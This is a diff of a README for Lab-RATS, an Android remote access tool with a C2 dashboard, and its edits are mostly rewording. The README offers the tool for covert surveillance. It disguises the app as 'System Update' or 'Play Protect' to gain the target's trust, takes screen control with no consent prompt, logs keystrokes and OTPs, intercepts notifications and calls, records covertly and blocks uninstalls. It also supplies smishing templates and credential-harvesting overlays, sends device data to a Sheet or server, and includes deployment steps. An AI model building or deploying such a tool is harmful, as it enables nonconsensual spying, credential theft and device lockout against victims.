@@ -1,7 +1,6 @@
 <p align="center">
 <img width="1417" height="382" alt="Screenshot 2026-09-29 at 2 07 28 AM" src="https://github.com/user-attachments/assets/b77a5010-165b-45fd-90f4-552d9a6a6c70" />
 
-
 <p align="center">
   <img src="https://img.shields.io/badge/JDK-21-gold?style=for-the-badge&logo=openjdk&logoColor=white">
   <img src="https://img.shields.io/badge/Android-SDK_34-green?style=for-the-badge&logo=android&logoColor=white">
@@ -16,13 +15,12 @@
 # Lab-RATS
 > Lightweight Android-Built Remote Administration Tool for Security: *(L.A.B. - R.A.T.S)*
 
-**Lab-RATS is a powerful, open-source and lightweight Android Remote Administration framework packed with advanced monitoring** and **interaction capabilities**. The system **automates the generation of custom, signed `.apk` files for deployment onto any Android device**, providing **full device telemetry via a sleek, web-based C2 dashboard**. **Built to adapt to strict modern mobile environments**, it delivers a **robust feature suite** that **operates reliably** across **legacy and the newest Android releases**
+**Lab-RATS is an open-source, lightweight Android Remote Administration framework** packed with powerful **monitoring** and **interaction capabilities**. The system automates the generation of custom, signed `.apk` files for **deployment onto any Android device**, providing full device telemetry via a **sleek, web-based C2 dashboard**. Built to adapt to **strict modern mobile environments**, it delivers a **robust feature suite** that **operates reliably** across both **legacy** and the **newest Android releases**.
 
 ---
 
-## 🌐 Persistent Remote Access
+## 🌎 Direct IPv6 Access *(P2P connection)*:
 
-### 🌎 Direct IPv6 Access *(P2P connection)*:
 **Lab-RATS leverages the unique characteristics of publicly routable IPv6 addresses assigned by modern Wi-Fi and cellular *(5G/LTE)* carriers**. By **binding the control server directly to a device's Global Unicast Address** *(GUA)*, the tool **completely bypasses Carrier-Grade NAT** *(CGNAT)* and **inbound firewall restrictions**. This architecture **enables seamless, Zero-Configuration peer-to-peer** *(P2P)* **remote access from any modern web browser worldwide**—completely eliminating the need for **router manipulation, port forwarding**, or **third-party tunneling services** like **Ngrok** or **Pinggy**.
 
 ---
@@ -56,14 +54,14 @@
 - **Encrypted Local Telemetry**: Internal **system logs are encrypted at build-time**, rendering them **unreadable to standard mobile forensic tools**.
 
 ### 🎭 **Stealth App Decoys**:
-**Remotely swap the entire Lab-RATS app identity and icon** using **the "Masquerade Library"** of **Fully Functional Clones**:
+**Remotely swap the entire Lab-RATS app identity and icon instantly** using **the "Masquerade Library"** of convincing **Fully Functional Clones**:
 - 👀 **System Update** *(Default)*: **Used for initial install** it **simulates a system update** and **prompts for permissions during the process**, achieving **highly successful installs**.
 - 🧮 **Calculator**: Performs **actual math** with a **tactical logic engine**.
 - 🌦️ **Weather App**: Displays **real-time localized forecasts** via **Open-Meteo API**.
 - 🛡️ **Play Protect**: Simulates **a legitimate security scan** to **build target trust**.
 - 🐭 **Lab-Rats & System Stability Services**: **Completely unmasked** and **directly opens** the C2 server interface on device.
 <details>
-  <summary>📸 Click to view App Decoy Icons</summary>
+  <summary>📸 Click to view Stealth App Decoys</summary>
   <br>
   <img src="https://github.com/user-attachments/assets/f2114dda-1090-4395-add2-6007f48cff8f" alt="Full Web Page Screenshot" width="50%">
 </details>
@@ -89,25 +87,25 @@
 ### 👻 Ghost_Operations:
 - **Ghost Control/Live Feed**: **Cast & Control the live screen remotely** with **NO "Consent Prompt" required**.
 - **Blackout Mode**: A **high-stealth mode** designed to **physically mask the targets device display** while maintaining a **NON-masked live remote feed**. *(Pair with Ghost Control for maximum stealth)*
-- **NEW! GhostToast Protocol**: Dispatch **tactical, persistent overlays**. Supports **Custom Colors, Animations (Pop, Static, Scroll)**, and **Chaotic "Burnt Toast" mode** *(multiple random spawns to overwhelm the device)*.
+- **NEW! Ghost_Toast**: Dispatch **tactical, persistent overlays**. Supports **Custom Colors, Animations (Pop, Static, Scroll)**, and **Chaotic "Burnt_Toast" mode** *(multiple random popups spawn to overwhelm the device)*.
 - **NEW! Remote System Denial Lock**: Deploy a **persistent, full-screen security overlay** to **lock physical interaction** and **render the device inoperable until hard-reset/restarted** or **unlocked remotely from the C2 dashboard**.
 - **Live Keylogging**: Intercept **keystrokes** and **system text in real-time**. Now features **Sensitive Info Highlighting** *(Passcodes, OTPs, Emails glow Red)* and **Deep Extraction** for **browser login info**.
 
 ### 🧪 NEW! Exploit_Factory:
 - **NFC Proximity Vector**: Generate **binary NDEF payloads for physical tags**.
-- **QR Visual Vector**: Dedicated **high-density QR generator** for independent URL delivery.
+- **QR Visual Vector**: Dedicated **high-density QR code generator** for independent URL delivery.
 - **Smishing Library**: Pre-configured **tactical phishing templates** with **automated C2 link injection**.
-- **Shadow Overlay (Phishing)**: Remotely **inject functional, pixel-perfect credential-harvesting overlays** over the device.
+- **Shadow Overlay**: Remotely **inject functional, pixel-perfect credential-harvesting overlays** to the device.
 
 ### 💀 Anti-Removal Shield (Optimized):
 - **High-speed, event-driven protection** that **blocks attempts** to **Uninstall** or **Force Stop** the **app**.
 - **Suicide Protocol (Self-Destruct)**: **Remote-triggered persistent loop** that **wipes all local configuration** and initiates a **hard uninstallation of the C2 core**.
 
-### 🛰️ Precision GPS Tracking & Intel_Stream (Notification Sniffer):
+### 🛰️ Precision GPS Tracking & Intel Stream (Notification Sniffer):
 - **One-click uplink** to open the **devices exact real-time location** in **Google Maps**.
 - **Intercept every notification** *(WhatsApp, Telegram, RCS, System...etc)* in a **live feed**.
 
-### 📸 Tactical_Surveillance Hub (Ultra-Stability):
+### 📸 Tactical Surveillance Hub (Ultra-Stability):
 - **Covert Recording**: **Stealthily record video without any user-facing activity**.
 - **Snap Photos**: **Covert image capture** integrated into the **live stream**.
 - **Nightmode V2**: Aggressive **electronic brightening** for **low-light environments**. Now features **Hardware Breathe Sync** and **AE Bypass** for **zero-freeze operation** on **modern high-latency sensors**.
@@ -115,19 +113,19 @@
 ### 🎙️ Acoustics & Interception:
 - **Live microphone recording** and **automated call recording** for **both incoming and outgoing calls**.
 
-### 📂 Advanced_Data Uplink:
+### 📂 Advanced Data Uplink:
 - **Integrated File Manager**: **Navigate, download**, and **manage files**. Features an **instant Search Bar** and **Category Filters**.
 - **Info Gathering**: Access **Call Logs**, **Contacts**, **Hardware Analytics**, and **Installed Apps** remotely.
 - **📝 Direct File Editor**: **Live-edit text, JSON**, and **log files** directly **on the device**.
 
-### 🖥️ Enhanced_Remote_Shell:
+### 🖥️ Enhanced Remote Shell:
 The **Terminal Tabs Built-in Shell has been overhauled** for **professional workflows**:
 - **Command History**: Navigate **previous commands instantly** using **Up/Down arrows**.
 - **Modernized Interface**: Updated to `root@Android` prompt with **an updated `help` menu**.
 - **Hardened I/O**: **Multi-stage retry logic** and **unique execution tracking** for **zero-latency command output**.
 
 ### 📊 Telemetry & Reporting:
-- **C2 Auto-Reporting**: **Discrete** reporting of **IP, Battery %, Network Type *(WiFi/Cellular)*, and Stealth Status** to a centralized **Google Sheet or Render C2**.
+- **C2 Auto-Reporting**: **Discrete** reporting of **Date & Time, Device Make & Model, Connection Type *(WiFi/Cellular)*, IP Address, Port, Active C2 Dashboard Link, Battery %, Stealth Status, Charging Status, and Storage Space** to a centralized **Google Sheet or Render C2**.
 
 ---
 
@@ -139,7 +137,7 @@ The **Terminal Tabs Built-in Shell has been overhauled** for **professional work
 - **Unrestricted Tools**: **Install** and **run Python scripts, Nmap scans, or Metasploit** from the **C2 web terminal**.
 - **Persistent Environment**: Full support for **Termux's internal storage** and **standard Linux binaries**.
 > [!NOTE]
-> **Termux Bridge Issues**: "**Termux `allow-external-apps` setting is disabled**".(Most Common)
+> **Termux Bridge Issues**: "**Termux `allow-external-apps` setting is disabled**" (Most Common).
 <br>**Solution**: **On the Target Device** open **Termux and run**:
 ```
 echo "allow-external-apps = true" >> ~/.termux/termux.properties
@@ -155,7 +153,7 @@ termux-reload-settings
 ### ☝🏻 Option 1: Google Sheet (Updated)
 **Best for basic IP tracking** and **logging**. **No server maintenance required**.
 
-1.  **Create** a **New Google Sheet**.
+1.  **Create** a new <a href="https://docs.google.com/spreadsheets/u/0/" target="_blank">Google Sheet</a>.
 2.  Go to **Extensions** → **Apps Script** and **Paste in the Hybrid Snippet below:**
 
 ```javascript
@@ -208,7 +206,7 @@ function handleRequest(e) {
 3.  Click **Deploy** → **New Deployment** → **Web App** → **Execute as Me** *(E-Mail)* → **Who has Access: Anyone**.
 
 > [!IMPORTANT]
-> 4.  **Copy the Webhook URL they provide** and **prepare to paste it into the APK-builder tool** when **prompted**. *(Get Started Section Below)*
+> 4.  **Copy the Webhook URL provided** and **prepare to paste it into the APK-builder tool** when **prompted**. *(Get Started Section Below)*
 
 ---
 
@@ -219,7 +217,7 @@ function handleRequest(e) {
 2.  **Get your URL**: Once your **service is live**, copy the URL (e.g., `https://labrats-c2.onrender.com`).
 3.  **Hard-code the Link**: **Enter the Render URL** into the **APK Builder** when **prompted** for the `WEBHOOK_URL`.
 
-#### Advantages of Option 2:
+**Advantages of Option 2**:
 - 🌐 **Dual-Stack IP Binding**: **Full support for both IPv4 and IPv6 connections**, enabling **seamless C2 telemetry** and **reverse WebSocket tunneling** across **cellular carrier NAT64** and **dual-stack Wi-Fi networks**.
 - 📂 **Exfiltration Vault**: **Audio/Video recordings** are automatically uploaded and **stored on your server**.
 - 📡 **Live Fleet List**: A **professional glass-morphism dashboard** to **manage all "Rats" in one place**.
@@ -228,11 +226,11 @@ function handleRequest(e) {
 
 ---
 
-## 🛠️ Get_Started
+## 🛠️ Get Started
 
 ### 1. Requirements
 *   **Java 17 or 21 installed** on your **workstation**.
-*   A **Test Android** device. 📱 *(Samsung/Pixel/OnePlus/HTC supported)*
+*   A **Test Android device**. 📱 *(Samsung/Pixel/OnePlus/HTC supported)*
 *   Your **Google Sheet Webhook URL or Render URL**. *(previous sections above)*
 
 ### 2. Building the APK (on PC)
@@ -268,7 +266,7 @@ Once the **Target device** downloads the **APK**:
 2.  **Permissions (CRITICAL)**: **Open the app ONCE**. It will **prompt for necessary permissions** *(Camera, SMS, Files, etc)*.
     -  **Remote Permission Prompt**: If the **user skips some permissions**, you can **remotely trigger the system prompt again** from the **Ghost Tab** using the **REPAIR PERMISSIONS** button.
 3.  **Self-Vanishing**: A few seconds **after launch, the app will automatically replace its icon and name** with the **decoy you chose during build** *("System Update", "Calculator"...etc)*.
-4.  **Uplink Confirmation**: Check your **Google Sheet**. Within **5 seconds of initialization**, the **Device Brand & Model #, Connection Type, IP Address, Port #, Active C2 Dashboard Link, Battery %, Stealth Status, Charging Status and Storage Space will appear in the log**.
+4.  **Uplink Confirmation**: Check your **Google Sheet**. Within **5 seconds of initialization**, the **Device Make & Model, Connection Type, IP Address, Port, Active C2 Dashboard Link, Battery %, Stealth Status, Charging Status and Storage Space will appear in the log**.
 
 <details>
   <summary>📸 Click to view Example Google Sheet Reporting</summary>
@@ -302,9 +300,9 @@ bc1q8d66m0qthnh6nw9hc5wl09m7pfydk46q5w8rxx
 
 ## 📸 Screenshots & Video Clips
 
-### Example APK build in Terminal (Mac OS):
+### APK-Builder Tool Example (Mac OS):
 > [!NOTE]
-> *This build excludes my Google Sheet Webhook URL for security. For normal private builds, you must add your own Google Webhook URL to correctly receive the IPv6 address link from the app after installation.*
+> *This build **excludes** my Google Sheet Webhook URL for security. For normal private builds, you must add your own Google Webhook URL to correctly receive the active C2 dashboard link from the app after installation*. *(Instructions above)*
 
 https://github.com/user-attachments/assets/45419d9f-df4f-478e-8e69-d3c42ef09bdb
 
@@ -316,7 +314,7 @@ https://github.com/user-attachments/assets/45419d9f-df4f-478e-8e69-d3c42ef09bdb
 
 ---
 
-### Lab-RATS Initial Install Sequence & Icon Stealth Preview
+### Lab-RATS Initial Install Sequence & Icon Stealth Preview:  
 
 https://github.com/user-attachments/assets/d1b27cb9-24bf-4f7b-8241-f839a9d5c145
 
